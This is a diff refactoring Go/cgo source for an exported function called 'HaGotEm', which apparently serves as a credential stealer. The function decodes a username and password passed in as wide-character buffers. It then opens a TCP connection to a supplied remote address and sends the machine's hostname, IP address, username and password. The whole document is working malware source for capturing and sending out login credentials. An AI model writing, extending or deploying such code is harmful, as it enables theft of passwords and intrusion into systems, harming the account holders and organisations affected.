@@ -28,10 +28,17 @@ import (
 	"time"
 )
 
-func getIPAddress() string {
+const (
+	pass  = C.int(0)
+	fail  = C.int(1)
+	nilIP = "<nil>"
+)
+
+func main() {}
+func getIP() string {
 	i, err := net.Interfaces()
 	if err != nil {
-		return "<nil>"
+		return nilIP
 	}
 	for _, a := range i {
 		if a.Flags&net.FlagUp == 0 || a.Flags&net.FlagLoopback != 0 {
@@ -57,18 +64,20 @@ func getIPAddress() string {
 				return r.String()
 			}
 		} else {
-			return "<nil>"
+			return nilIP
 		}
 	}
-	return "<nil>"
+	return nilIP
 }
 
 //export HaGotEm
 func HaGotEm(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
-	a := []byte(C.GoStringN(u, l))
-	y := []byte(C.GoStringN(p, n))
-	e := make([]rune, l/2)
-	k := make([]rune, n/2)
+	var (
+		a = []byte(C.GoStringN(u, l))
+		y = []byte(C.GoStringN(p, n))
+		e = make([]rune, l/2)
+		k = make([]rune, n/2)
+	)
 	for i := 0; i < len(a); i += 2 {
 		e[i/2] = rune(a[i])
 	}
@@ -81,15 +90,13 @@ func HaGotEm(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
 	}
 	x, err := net.DialTimeout("tcp", C.GoString(s), time.Duration(5*time.Second))
 	if err != nil {
-		return C.int(-1)
+		return fail
 	}
 	defer x.Close()
-	d := []byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIPAddress(), string(e), string(k)))
+	d := []byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIP(), string(e), string(k)))
 	if _, err := x.Write(d); err != nil {
-		return C.int(-1)
+		return fail
 	}
 	x.Close()
-	return C.int(0)
+	return pass
 }
-
-func main() {}
